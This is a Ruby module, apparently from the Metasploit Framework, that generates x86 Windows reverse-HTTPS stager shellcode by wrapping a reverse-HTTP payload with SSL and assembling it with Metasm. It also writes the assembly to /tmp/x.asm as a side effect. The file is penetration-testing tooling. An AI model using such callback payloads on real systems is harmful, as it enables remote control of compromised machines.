# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/reverse_http'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS
#
###


module Payload::Windows::ReverseHttps

  include Msf::Payload::Windows::ReverseHttp

  def asm_reverse_https(opts={})

    #
    # options should contain:
    #    ssl:   (true|false)
    #    url:   "/url_to_request"
    #   host:   [hostname]
    #

    asm_reverse_http(opts.merge({ssl: true}))
  end

  def generate_reverse_https(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_https(opts)}
    ^

    File.open("/tmp/x.asm", "wb"){|fd| fd.write combined_asm}
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

end

end

